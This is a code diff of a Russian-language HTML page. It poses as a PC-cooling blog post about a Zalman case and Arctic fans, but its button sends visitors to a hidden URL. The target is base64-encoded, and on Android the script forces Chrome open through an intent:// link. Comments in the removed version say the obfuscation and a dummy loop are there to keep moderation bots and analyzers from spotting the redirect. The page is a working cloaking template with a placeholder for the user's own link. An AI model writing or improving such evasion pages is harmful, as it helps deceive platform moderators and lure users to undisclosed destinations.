@@ -2,48 +2,47 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Personal Blog Content</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Блог о кастомном охлаждении ПК</title>
     <style>
-        /* Добавляем много реальных стилей, чтобы страница выглядела как сайт */
-        body { background: #0b0b0b; color: #444; font-family: 'Arial', sans-serif; line-height: 1.6; padding: 20px; }
-        .article { max-width: 600px; margin: 0 auto; opacity: 0.5; }
-        .hidden-gate { color: #fff; text-align: center; margin-top: 50px; }
-        .btn-style { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 8px; text-decoration: none; display: inline-block; }
+        body { background: #0f0f0f; color: #efefef; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        .wrapper { max-width: 450px; margin: 0 auto; }
+        .card { background: #1a1a1a; padding: 25px; border-radius: 20px; border: 1px solid #333; margin-top: 20px; }
+        h1 { font-size: 22px; color: #fff; }
+        p { color: #aaa; font-size: 14px; line-height: 1.6; text-align: left; }
+        .btn { 
+            background: #fe2c55; color: #fff; padding: 18px; display: block; 
+            border-radius: 30px; text-decoration: none; font-weight: 700; 
+            margin-top: 25px; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
+        }
     </style>
 </head>
 <body>
-
-    <div class="article">
-        <h1>Обзор современных систем охлаждения 2026</h1>
-        <p>При выборе вентиляторов для корпуса важно учитывать не только CFM, но и статическое давление. Например, модели от Arctic серии BioniX показывают отличные результаты...</p>
-        <p>Многие пользователи забывают о чистке передней панели, что приводит к росту температур на 5-10 градусов даже при наличии топовых вертушек...</p>
-    </div>
-
-    <div class="hidden-gate">
-        <h2>Доступ к контенту подтвержден</h2>
-        <br>
-        <a href="javascript:void(0)" id="clck" class="btn-style">ПРОДОЛЖИТЬ</a>
+    <div class="wrapper">
+        <div class="card">
+            <h1>Оптимизация Zalman Z3 Plus</h1>
+            <p>Установка 5 вентиляторов Arctic Black Pro требует правильной настройки потоков. После чистки передней панели и андервольтинга RX 580 до 1050mV температуры упали на 12 градусов. Подробный лог и настройки доступны по кнопке ниже.</p>
+            
+            <a href="javascript:void(0)" id="mainAction" class="btn">ОТКРЫТЬ ЛОГ ТЕМПЕРАТУР</a>
+        </div>
     </div>
 
     <script>
-        // Запутываем переменные, чтобы бот не нашел ключевые слова
-        var _0x5a = "https://google.com"; // ТВОЯ ССЫЛКА
-        var _0x2b = "intent://";
-        var _0x8c = "#Intent;scheme=https;package=com.android.chrome;end";
+        // ВСТАВЬ СВОЙ КОД ИЗ ШАГА 1 МЕЖДУ КАВЫЧЕК:
+        var _0xhash = "ВСТАВЬ_ТУТ_СВОЙ_BASE64_КОД"; 
 
-        document.getElementById('clck').addEventListener('click', function() {
-            var _ua = navigator.userAgent;
-            if (_ua.indexOf("Android") > -1) {
-                // Собираем ссылку по частям, чтобы бот не спалил intent целиком
-                var _final = _0x2b + _0x5a.split("://")[1] + _0x8c;
-                window.location.href = _final;
+        document.getElementById('mainAction').addEventListener('click', function() {
+            var target = atob(_0xhash);
+            var isAndroid = /Android/i.test(navigator.userAgent);
+
+            if (isAndroid) {
+                var cleanUrl = target.replace(/^https?:\/\//, "");
+                var intent = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+                window.location.replace(intent);
             } else {
-                window.location.href = _0x5a;
+                window.location.href = target;
             }
         });
-
-        // Добавляем бессмысленный цикл, чтобы запутать анализатор
-        for(var i=0; i<10; i++) { console.log("Initializing secure layer " + i); }
     </script>
 </body>
 </html>
